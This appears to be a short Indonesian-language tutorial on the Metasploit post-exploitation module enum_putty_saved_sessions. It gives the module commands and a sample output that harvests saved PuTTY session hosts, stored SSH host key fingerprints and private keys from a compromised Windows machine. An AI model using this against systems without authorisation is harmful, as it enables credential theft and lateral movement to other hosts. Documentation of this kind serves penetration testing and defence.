# enum_putty_saved_sessions

Modul `enum_putty_saved_sessions` di Metasploit adalah modul post-exploitation untuk sistem Windows yang digunakan untuk mengekstrak informasi sesi `PuTTY` yang tersimpan di `registry`, termasuk `alamat host`, `port`, dan `pengaturan koneksi`, yang dapat dimanfaatkan untuk akses ke sistem jarak jauh yang pernah dihubungi oleh target.

## Cara Penggunaan di Metasploit

```
use post/windows/gather/enum_putty_saved_sessions
set SESSION <ID>
set VERBOSE true
run
```

Hasil output-nya seperti ini:

```
[*] Looking for saved PuTTY sessions
[*] Found 1 session

PuTTY Saved Sessions
====================

 Name              HostName      UserName  PublicKeyFile  PortNumber  PortForwardings  ProxyUsername  ProxyPassword
 ----              --------      --------  -------------  ----------  ---------------  -------------  -------------
 server debian 12  192.168.1.27                           22

[+] PuTTY saved sessions list saved to /root/.msf4/loot/20250517033047_default_192.168.1.53_putty.sessions.c_578577.txt in CSV format & available in notes (use 'notes -t putty.savedsession' to view).
[*] Downloading private keys...

[*] Looking for previously stored SSH host key fingerprints
[*] Found 1 stored key fingerprint
[*] Downloading stored key fingerprints...

Stored SSH host key fingerprints
================================

 SSH Endpoint     Key Type(s)
 ------------     -----------
 192.168.1.27:22  ssh-ed25519

[+] PuTTY stored host keys list saved to /root/.msf4/loot/20250517033047_default_192.168.1.53_putty.storedfing_843501.txt in CSV format & available in notes (use 'notes -t putty.storedfingerprint' to view).

[*] Looking for Pageant...
[+] Pageant is running (Handle 0x0)
[*] Post module execution completed
```
